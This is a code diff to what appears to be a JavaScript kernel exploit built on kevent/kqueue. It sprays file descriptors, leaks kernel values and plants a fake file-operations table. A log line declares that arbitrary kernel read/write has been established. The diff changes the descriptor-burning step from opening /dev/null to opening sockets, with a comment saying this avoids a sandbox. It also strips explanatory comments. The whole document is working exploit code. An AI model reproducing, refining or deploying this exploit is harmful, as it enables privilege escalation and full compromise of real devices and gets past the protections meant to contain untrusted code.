@@ -18,10 +18,8 @@ const RTH_LEN = 248;
 const TPL_LO = 0x43434343;
 const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
-const DEV_NULL = "/dev/null";
 const OPS_OFF = 0x985a;
 
-// Dense array covering all slots from 8 to 248
 const CANDS = [];
 for (let i = 8; i <= 248; i += 8) CANDS.push(i);
 
@@ -219,13 +217,13 @@ function phase2Leak(rootKq, fds) {
   let tries = 0;
 
   for (let attempt = 1; attempt <= 6; attempt++) {
-    if (target >= 0 || tries >= 64) break; // Increased limit
+    if (target >= 0 || tries >= 64) break;
     log("KV-ATTEMPT", attempt + "/6");
     for (const fd of fds) { if (fd !== -1) disarm(fd); }
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
     log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
 
-    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 64; ci++) { // Increased limit
+    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 64; ci++) {
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
       const fd = fds[vi];
@@ -308,14 +306,10 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  // --- FD BURNER ---
-  const dev_null = allocBuf(16);
-  zeroBuf(dev_null);
-  for (let i = 0; i < DEV_NULL.length; i++) dev_null.dv.setUint8(i, DEV_NULL.charCodeAt(i));
-  
+  // --- FD BURNER (using sockets to avoid /dev/null sandbox) ---
   const burn = [];
   for (let i = 0; i < 250; i++) {
-    const fd = scn("open", dev_null.addr, 0, 0, 0, 0, 0);
+    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
     if (fd >= 0) burn.push(fd);
   }
   log("FD-BURN", "burned " + burn.length + " fds");
@@ -351,10 +345,9 @@ export async function runKevent(c) {
   const p = ctx().p;
   const F_FAKE_OPS = fake_page + 0x800n;
   
-  // Initialize Fake FileOps table
   for (let i = 0; i < 32; i++) p.write8(F_FAKE_OPS + BigInt(i * 8), R_RET0);
   p.write4(F_FAKE_OPS, 0n);
-  p.write8(F_FAKE_OPS + 0x18n, R_TOUCH); // f_touch
+  p.write8(F_FAKE_OPS + 0x18n, R_TOUCH);
 
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
